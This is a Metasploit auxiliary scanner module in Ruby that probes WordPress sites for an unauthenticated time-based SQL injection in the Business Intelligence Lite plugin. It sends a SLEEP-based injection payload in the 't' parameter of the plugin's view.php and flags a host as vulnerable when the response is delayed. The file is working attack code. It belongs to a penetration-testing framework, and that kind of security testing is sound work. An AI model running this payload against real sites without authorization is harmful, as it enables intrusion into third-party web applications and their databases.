##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Business Inteligence Lite SQLi Scanner',
      'Description' => %q{
      This module attempts to exploit SQL injection in Business Intelligence
      Lite version 1.6.1 for WordPress and likely prior in order if the instance
      is vulnerable.
      },
      'Author'       =>
        [
          'Jagriti Sahu', # Vulnerability Discovery - Correct?
          'Roberto Soares Espreto' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['WPVDB', '7879'],
          ['URL', 'http://packetstormsecurity.com/files/131228/']
        ],
      'DisclosureDate' => 'Apr 01 2015'
    ))

    register_options(
      [
        OptInt.new('SLEEP', [true, 'Calculate the response time (default: 7)', 7])
      ]
    )
  end

  def check
    check_plugin_version_from_readme('wp-business-intelligence-lite', '1.6.2')
  end

  def run_host(ip)
    start_time = Time.now
    timeout = datastore['SLEEP']

    print_status("#{peer} - Checking host...")

    res = send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_plugins, 'wp-business-intelligence-lite', 'view.php'),
      'vars_get'  => {
        't'       => "1 AND (SELECT * FROM (SELECT(SLEEP(#{timeout})))iqPT)"
      }
    )

    end_time = Time.now - start_time

    unless res && res.body
      vprint_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.code == 200 && end_time >= timeout
      print_good("#{peer} - Vulnerable to Unauth SQL Injection in \"Business Intelligence Lite 1.6.1\" plugin for WordPress")
      report_vuln(
        host:  rhost,
        port:  rport,
        proto: 'tcp',
        name:  'Unauth SQLi in Business Intelligence Lite 1.6.1 for WordPress',
        refs:  references
      )
    end
  end
end
